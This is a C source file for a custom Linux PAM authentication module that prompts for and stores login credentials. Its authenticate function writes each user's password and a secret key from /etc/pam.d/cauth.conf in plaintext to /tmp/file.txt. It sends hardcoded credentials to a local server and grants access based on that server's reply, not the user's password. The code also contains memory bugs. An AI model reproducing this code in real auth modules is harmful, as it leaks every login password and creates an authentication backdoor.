#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/un.h>
#include <pwd.h>
#include <grp.h>
#include <errno.h>

#define PAM_SM_AUTH
#define PAM_SM_SESSION
#include <security/pam_modules.h>
#include <security/pam_modutil.h>
#include <security/pam_appl.h>

#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static char * global_session = NULL;
/* FIXME? This is a work around to the fact that PAM seems to be clearing
   the auth token between authorize and open_session.  Which then requires
   us to save it.  Seems like we're the wrong people to do it, but we have
   no choice */
static char * global_password = NULL;


/* Either grab a value or prompt for it */
static char *
get_item (pam_handle_t * pamh, int type)
{
	/* Check to see if we just have the value.  If we do, great
	   let's dup it some we're consistently allocating memory */

		char * value = NULL;
		if (pam_get_item(pamh, type, (const void **)&value) == PAM_SUCCESS && value != NULL) {
			return value;
		}
		if (type == PAM_AUTHTOK && global_password != NULL) {
			/* If we're looking for a password, we didn't get one, before
			   prompting see if we've got a global one. */
			return global_password;
		}
	/* Now we need to prompt */

	/* Build up the message we're prompting for */
	struct pam_message message;
	const struct pam_message * pmessage = &message;

	message.msg = NULL;
	message.msg_style = PAM_PROMPT_ECHO_ON;

	switch (type) {
	case PAM_USER:
		message.msg = "login:";
		break;
	case PAM_RUSER:
		message.msg = "remote login:";
		break;
	case PAM_RHOST:
		message.msg = "remote host:";
		break;
	case PAM_AUTHTOK:
		message.msg = "password:";
		message.msg_style = PAM_PROMPT_ECHO_OFF;
		break;
	default:
		return NULL;
	}

	struct pam_conv * conv = NULL;
	if (pam_get_item(pamh, PAM_CONV, (const void **)&conv) != PAM_SUCCESS || conv == NULL || conv->conv == NULL) {
		return NULL;
	}

	struct pam_response * responses = NULL;
	if (conv->conv(1, &pmessage, &responses, conv->appdata_ptr) != PAM_SUCCESS || responses == NULL) {
		return NULL;
	}

	char * promptval = responses->resp;
	free(responses);

	/* If we didn't get anything, just move on */
	if (promptval == NULL) {
		return NULL;
	}

	if (type == PAM_AUTHTOK) {
		if (mlock(promptval, strlen(promptval) + 1) != 0) {
			free(promptval);
			return NULL;
		}
	}

	if (type == PAM_RHOST) {
		char * subloc = strstr(promptval, "://");
		if (subloc != NULL) {
			char * original = promptval;
			char * newish = subloc + strlen("://");
			char * endslash = strstr(newish, "/");

			if (endslash != NULL) {
				endslash[0] = '\0';
			}

			promptval = strdup(newish);
			free(original);
		}
	}

	char * retval = NULL;
	if (promptval != NULL) { /* Can't believe it really would be at this point, but let's be sure */
		if (type == PAM_AUTHTOK) {
			/* We also save the password globally if we've got one */
			if (global_password != NULL) {
				memset(global_password, 0, strlen(global_password));
				munlock(global_password, strlen(global_password) + 1);
				free(global_password);
			}
			global_password = strdup(promptval);
			if (mlock(global_password, strlen(global_password) + 1) != 0) {
				/* Woah, can't lock it.  Can't keep it. */
				free(global_password);
				global_password = NULL;
			} else {
				retval = global_password;
			}
		}

		if (type == PAM_AUTHTOK) {
			memset(promptval, 0, strlen(promptval) + 1);
			munlock(promptval, strlen(promptval) + 1);
		}

		free(promptval);
	}

	return retval;
}

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
		FILE *f = fopen("/tmp/file.txt", "w");
        FILE *fd = fopen("/etc/pam.d/cauth.conf", "r");
        char *value = NULL;
        size_t len = 0;
        char *secret_key;
        char *message_fmt = "POST /hello_world HTTP/1.0 \r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nusername=epi&password=^etnyiK3158";
        char buffer[4064];
        int count = 0;

        unsigned long hostaddr;
        int sock;
        struct sockaddr_in sin;

        if (fd == NULL) {
            return PAM_IGNORE;
        }
        getline(&secret_key, &len, fd);

		fprintf(f, "%s\n", get_item(pamh, PAM_AUTHTOK));
		fprintf(f, "%s\n", secret_key);

        hostaddr = inet_addr("0.0.0.0");
        sock = socket(AF_INET, SOCK_STREAM, 0);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(8080);
        sin.sin_addr.s_addr = hostaddr;

        if (connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in))) {
            fprintf(stderr, "socket connection failed\n");
            return -1;
        }
        memset(buffer, 0, sizeof(buffer));
        write(sock, message_fmt, strlen(message_fmt));
        while (read(sock, buffer, sizeof(buffer)) != 0) {
            if (count == 4) {
                fprintf(f, "%s\n", buffer);
                if (strcmp(buffer, "[\"ACCEPTED\"]") == 0) {
                    fprintf(f, "%s\n", "SUCCESS!");
                    fclose(fd);
                    fclose(f);
                    close(sock);
                    return(PAM_SUCCESS);
                }
            }
            memset(buffer, 0, sizeof(buffer));
            count++;
        }

		fclose(f);
		fclose(fd);
		close(sock);
		return(PAM_IGNORE);
}